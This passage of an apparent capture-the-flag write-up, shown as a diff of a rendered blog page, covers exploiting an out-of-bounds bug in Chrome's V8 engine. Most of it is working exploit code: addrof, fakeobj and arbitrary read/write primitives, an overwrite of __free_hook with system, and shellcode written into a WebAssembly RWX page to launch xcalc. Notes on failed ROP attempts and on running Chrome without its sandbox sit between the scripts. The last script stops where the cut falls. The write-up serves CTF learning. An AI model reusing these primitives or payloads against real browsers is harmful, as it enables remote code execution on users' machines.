+<span class="kd">var</span> <span class="nx">shellcode</span><span class="o">=</span><span class="p">[</span><span class="mh">0x90909090</span><span class="p">,</span><span class="mh">0x90909090</span><span class="p">,</span><span class="mh">0x782fb848</span><span class="p">,</span><span class="mh">0x636c6163</span><span class="p">,</span><span class="mh">0x48500000</span><span class="p">,</span><span class="mh">0x73752fb8</span><span class="p">,</span><span class="mh">0x69622f72</span><span class="p">,</span><span class="mh">0x8948506e</span><span class="p">,</span><span class="mh">0xc03148e7</span><span class="p">,</span><span class="mh">0x89485750</span><span class="p">,</span><span class="mh">0xd23148e6</span><span class="p">,</span><span class="mh">0x3ac0c748</span><span class="p">,</span><span class="mh">0x50000030</span><span class="p">,</span><span class="mh">0x4944b848</span><span class="p">,</span><span class="mh">0x414c5053</span><span class="p">,</span><span class="mh">0x48503d59</span><span class="p">,</span><span class="mh">0x3148e289</span><span class="p">,</span><span class="mh">0x485250c0</span><span class="p">,</span><span class="mh">0xc748e289</span><span class="p">,</span><span class="mh">0x00003bc0</span><span class="p">,</span><span class="mh">0x050f00</span><span class="p">];</span>
+</code></pre></div></div>
+
+<p>Finally, copying the shellcode to the RWX page and calling the wasm function results in popping calc:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Copying xcalc shellcode to RWX page</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="nx">copy_shellcode</span><span class="p">(</span><span class="nx">rwx_page_addr</span><span class="p">,</span> <span class="nx">shellcode</span><span class="p">);</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Popping calc</span><span class="dl">"</span><span class="p">);</span>
+
+<span class="nx">f</span><span class="p">();</span>
+</code></pre></div></div>
+
+<p><img src="/images/oob-v8/calc_popped_wasm.png" alt="Popping calc using wasm" /></p>
+
+<h2 id="things-that-didnt-work">Things that didn’t work</h2>
+
+<h3 id="rop-chain-executes-but-never-does-anything">ROP chain executes but never does anything</h3>
+
+<p>After getting arbitrary read / write, I attempted to also try leaking the <code class="highlighter-rouge">__environ</code> pointer in libc and reading it to get a stack address. I then attempted to trample backwards over the stack with a ROP chain filled with NOPs, followed by a call to <code class="highlighter-rouge">mprotect</code> that turns a page in memory with my pre-placed shellcode into an RWX region.</p>
+
+<p>Although I can confirm through GDB that my ROP chain works, execution goes straight through <code class="highlighter-rouge">mprotect</code>, jumps to my shellcode, but fails because the page never becomes executable. I also tried to do a ROP chain into <code class="highlighter-rouge">system("xcalc")</code>, but even that didn’t work.</p>
+
+<p>If anyone can tell me why this approach did not work, I would love to hear it. To clarify, execution definitely jumps to my ROP chain, and it definitely executes all instructions in my ROP chain, but <code class="highlighter-rouge">mprotect</code> did not make my shellcode executable, nor did <code class="highlighter-rouge">system("xcalc");</code> pop calc. Please DM me on twitter if you know why this is the case!</p>
+
+<h3 id="exploit-only-works-through-d8-not-through-the-chrome-binary-provided-for-the-challenge">Exploit only works through d8, not through the Chrome binary provided for the challenge</h3>
+
+<p>This is the other issue I ran into. If I insert the exploit scripts into <code class="highlighter-rouge">&lt;script&gt;...&lt;/script&gt;</code> tags inside a html file and open it in the vulnerable version of Chrome presented for this challenge, all of my arbitrary reads return 0.</p>
+
+<p>I debugged this for a bit, and it seems like (to the best of my knowledge) that any addresses that I pass into my arbitrary read primitive function are being searched for within the <code class="highlighter-rouge">chrome</code> browser process, and not within the renderer process.</p>
+
+<p>I’ve attached gdb to both the browser process and the renderer process, and I can confirm that they have different memory mappings, which would explain why my arbitrary reads return 0. The browser process simply does not have those memory regions mapped.</p>
+
+<p>If anyone knows how to fix this, feel free to DM me. This is the only thing I’m missing that’s preventing me from fully completing this challenge.</p>
+
+<p><strong>Update</strong>: I’ve figured out how to fix it. It was a problem with my html file. Essentially, the html file needs to look like the following:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"pwn.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+  <span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>The reason it wasn’t working was because I didn’t put the script into a separate file. I embedded the entire script in between <code class="highlighter-rouge">&lt;script&gt;...&lt;/script&gt;</code> tags. Putting it in a separate file fixes this issue.</p>
+
+<p>Run chrome with <code class="highlighter-rouge">./chrome --no-sandbox ./index.html</code> to trigger the script. Only the WebAssembly version of the exploit works. I believe the way I leaked the addresses for the <code class="highlighter-rouge">__free_hook</code> version doesn’t bode well when Chrome is ran.</p>
+
+<h2 id="final-exploit-scripts">Final exploit scripts</h2>
+
+<p>Feel free to DM me any questions you may have through Twitter.</p>
+
+<p>Exploit for overwriting <code class="highlighter-rouge">__free_hook</code> to <code class="highlighter-rouge">&amp;system</code> and calling it by doing <code class="highlighter-rouge">console.log("xcalc");</code>:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">/// Helper functions to convert between float and integer primitives</span>
+<span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// 8 byte array buffer</span>
+<span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// typeof(val) = float</span>
+    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="c1">// Watch for little endianness</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// typeof(val) = BigInt</span>
+    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
+    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="c1">/// Construct addrof primitive</span>
+<span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">A</span><span class="dl">"</span><span class="p">:</span><span class="mi">1</span><span class="p">};</span>
+<span class="kd">var</span> <span class="nx">obj_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">obj</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">float_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">obj_arr_map</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">();</span>
+<span class="kd">var</span> <span class="nx">float_arr_map</span> <span class="o">=</span> <span class="nx">float_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">();</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Float array map: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Object array map: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">obj_arr_map</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">in_obj</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// First, put the obj whose address we want to find into index 0</span>
+    <span class="nx">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">in_obj</span><span class="p">;</span>
+
+    <span class="c1">// Change the obj array's map to the float array's map</span>
+    <span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">);</span>
+
+    <span class="c1">// Get the address by accessing index 0</span>
+    <span class="kd">let</span> <span class="nx">addr</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="c1">// Set the map back</span>
+    <span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">obj_arr_map</span><span class="p">);</span>
+
+    <span class="c1">// Return the address as a BigInt</span>
+    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// First, put the address as a float into index 0 of the float array</span>
+    <span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
+
+    <span class="c1">// Change the float array's map to the obj array's map</span>
+    <span class="nx">float_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">obj_arr_map</span><span class="p">);</span>
+
+    <span class="c1">// Get a "fake" object at that memory location and store it</span>
+    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="c1">// Set the map back</span>
+    <span class="nx">float_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">);</span>
+
+    <span class="c1">// Return the object</span>
+    <span class="k">return</span> <span class="nx">fake</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="c1">// This array is what we will use to write to arbitrary memory addresses</span>
+<span class="kd">var</span> <span class="nx">arb_rw_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">float_arr_map</span><span class="p">,</span> <span class="nx">itof</span><span class="p">(</span><span class="mh">0x0000000200000000</span><span class="nx">n</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0xffffffff</span><span class="p">];</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Controlled float array: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">arb_rw_arr</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// We have to use tagged pointers, so if the addr isn't tagged, we tag it</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="nx">addr</span> <span class="o">+=</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
+    
+    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arb_rw_arr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
+    <span class="nx">arb_rw_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arb_rw_arr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
+    <span class="nx">arb_rw_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>
+    <span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">dataview</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">DataView</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">buf_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">backing_store_addr</span> <span class="o">=</span> <span class="nx">buf_addr</span> <span class="o">+</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">;</span>
+    <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">backing_store_addr</span><span class="p">,</span> <span class="nx">addr</span><span class="p">);</span>
+    <span class="nx">dataview</span><span class="p">.</span><span class="nx">setBigUint64</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">val</span><span class="p">),</span> <span class="kc">true</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">var</span> <span class="nx">test</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Array</span><span class="p">([</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">]);</span>
+
+<span class="kd">var</span> <span class="nx">test_addr</span> <span class="o">=</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">test</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">map_ptr</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">test_addr</span> <span class="o">-</span> <span class="mi">1</span><span class="nx">n</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">map_sec_base</span> <span class="o">=</span> <span class="nx">map_ptr</span> <span class="o">-</span> <span class="mh">0x2f79</span><span class="nx">n</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">heap_ptr</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">map_sec_base</span> <span class="o">+</span> <span class="mh">0x18</span><span class="nx">n</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">PIE_leak</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">heap_ptr</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">PIE_base</span> <span class="o">=</span> <span class="nx">PIE_leak</span> <span class="o">-</span> <span class="mh">0xd87ea8</span><span class="nx">n</span><span class="p">;</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] test array: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">test_addr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] test array map leak: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">map_ptr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] map section base: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">map_sec_base</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] heap leak: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">heap_ptr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] PIE leak: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">PIE_leak</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] PIE base: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">PIE_base</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="nx">puts_got</span> <span class="o">=</span> <span class="nx">PIE_base</span> <span class="o">+</span> <span class="mh">0xd9a3b8</span><span class="nx">n</span><span class="p">;</span>
+<span class="nx">libc_base</span> <span class="o">=</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">puts_got</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x809c0</span><span class="nx">n</span><span class="p">;</span>
+<span class="nx">free_hook</span> <span class="o">=</span> <span class="nx">libc_base</span> <span class="o">+</span> <span class="mh">0x3ed8e8</span><span class="nx">n</span><span class="p">;</span>
+<span class="nx">system</span> <span class="o">=</span> <span class="nx">libc_base</span> <span class="o">+</span> <span class="mh">0x4f440</span><span class="nx">n</span><span class="p">;</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Libc base: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">libc_base</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] __free_hook: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">free_hook</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] system: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">system</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Overwriting __free_hook to &amp;system</span><span class="dl">"</span><span class="p">);</span>
+<span class="nx">arb_write</span><span class="p">(</span><span class="nx">free_hook</span><span class="p">,</span> <span class="nx">system</span><span class="p">);</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">xcalc</span><span class="dl">"</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Exploit for creating an RWX page using WebAssembly, overwriting it with shellcode to call <code class="highlighter-rouge">execve("/usr/bin/xcalc", ["/usr/bin/xcalc"], ["DISPLAY:=0"])</code>:</p>
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">/// Helper functions to convert between float and integer primitives</span>
+<span class="kd">var</span> <span class="nx">buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">ArrayBuffer</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span> <span class="c1">// 8 byte array buffer</span>
+<span class="kd">var</span> <span class="nx">f64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Float64Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">u64_buf</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Uint32Array</span><span class="p">(</span><span class="nx">buf</span><span class="p">);</span>
+
+<span class="kd">function</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// typeof(val) = float</span>
+    <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
+    <span class="k">return</span> <span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">+</span> <span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="o">&lt;&lt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span> <span class="c1">// Watch for little endianness</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// typeof(val) = BigInt</span>
+    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="nx">n</span><span class="p">);</span>
+    <span class="nx">u64_buf</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">Number</span><span class="p">(</span><span class="nx">val</span> <span class="o">&gt;&gt;</span> <span class="mi">32</span><span class="nx">n</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nx">f64_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+<span class="p">}</span>
+
+<span class="c1">/// Construct addrof primitive</span>
+<span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{</span><span class="dl">"</span><span class="s2">A</span><span class="dl">"</span><span class="p">:</span><span class="mi">1</span><span class="p">};</span>
+<span class="kd">var</span> <span class="nx">obj_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">obj</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">float_arr</span> <span class="o">=</span> <span class="p">[</span><span class="mf">1.1</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">];</span>
+<span class="kd">var</span> <span class="nx">obj_arr_map</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">();</span>
+<span class="kd">var</span> <span class="nx">float_arr_map</span> <span class="o">=</span> <span class="nx">float_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">();</span>
+
+<span class="kd">function</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">in_obj</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// First, put the obj whose address we want to find into index 0</span>
+    <span class="nx">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">in_obj</span><span class="p">;</span>
+
+    <span class="c1">// Change the obj array's map to the float array's map</span>
+    <span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">);</span>
+
+    <span class="c1">// Get the address by accessing index 0</span>
+    <span class="kd">let</span> <span class="nx">addr</span> <span class="o">=</span> <span class="nx">obj_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="c1">// Set the map back</span>
+    <span class="nx">obj_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">obj_arr_map</span><span class="p">);</span>
+
+    <span class="c1">// Return the address as a BigInt</span>
+    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// First, put the address as a float into index 0 of the float array</span>
+    <span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">addr</span><span class="p">);</span>
+
+    <span class="c1">// Change the float array's map to the obj array's map</span>
+    <span class="nx">float_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">obj_arr_map</span><span class="p">);</span>
+
+    <span class="c1">// Get a "fake" object at that memory location and store it</span>
+    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">float_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+
+    <span class="c1">// Set the map back</span>
+    <span class="nx">float_arr</span><span class="p">.</span><span class="nx">oob</span><span class="p">(</span><span class="nx">float_arr_map</span><span class="p">);</span>
+
+    <span class="c1">// Return the object</span>
+    <span class="k">return</span> <span class="nx">fake</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="c1">// This array is what we will use to read from and write to arbitrary memory addresses</span>
+<span class="kd">var</span> <span class="nx">arb_rw_arr</span> <span class="o">=</span> <span class="p">[</span><span class="nx">float_arr_map</span><span class="p">,</span> <span class="mf">1.2</span><span class="p">,</span> <span class="mf">1.3</span><span class="p">,</span> <span class="mf">1.4</span><span class="p">];</span>
+
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">[+] Controlled float array: 0x</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">addrof</span><span class="p">(</span><span class="nx">arb_rw_arr</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>
+
+<span class="kd">function</span> <span class="nx">arb_read</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// We have to use tagged pointers for reading, so we tag the addr</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nx">addr</span> <span class="o">%</span> <span class="mi">2</span><span class="nx">n</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="nx">addr</span> <span class="o">+=</span> <span class="mi">1</span><span class="nx">n</span><span class="p">;</span>
+
+    <span class="c1">// Place a fakeobj right on top of our crafted array with a float array map</span>
+    <span class="kd">let</span> <span class="nx">fake</span> <span class="o">=</span> <span class="nx">fakeobj</span><span class="p">(</span><span class="nx">addrof</span><span class="p">(</span><span class="nx">arb_rw_arr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x20</span><span class="nx">n</span><span class="p">);</span>
+
+    <span class="c1">// Change the elements pointer using our crafted array to read_addr-0x10</span>
+    <span class="nx">arb_rw_arr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="nx">itof</span><span class="p">(</span><span class="nx">BigInt</span><span class="p">(</span><span class="nx">addr</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x10</span><span class="nx">n</span><span class="p">);</span>
+
+    <span class="c1">// Index 0 will then return the value at read_addr</span>
+    <span class="k">return</span> <span class="nx">ftoi</span><span class="p">(</span><span class="nx">fake</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nx">initial_arb_write</span><span class="p">(</span><span class="nx">addr</span><span class="p">,</span> <span class="nx">val</span><span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Place a fakeobj right on top of our crafted array with a float array map</span>
